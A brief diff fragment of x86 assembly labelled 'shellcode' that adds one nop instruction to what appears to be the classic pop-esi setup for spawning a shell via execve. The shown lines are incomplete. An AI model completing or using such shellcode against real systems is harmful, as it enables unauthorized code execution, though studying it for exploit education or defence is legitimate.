@@ -9,6 +9,7 @@ _start:
 shellcode:
 
     pop esi
+    nop
     xor eax, eax
     mov byte [esi + 7], al
     lea     ebx,    [esi]
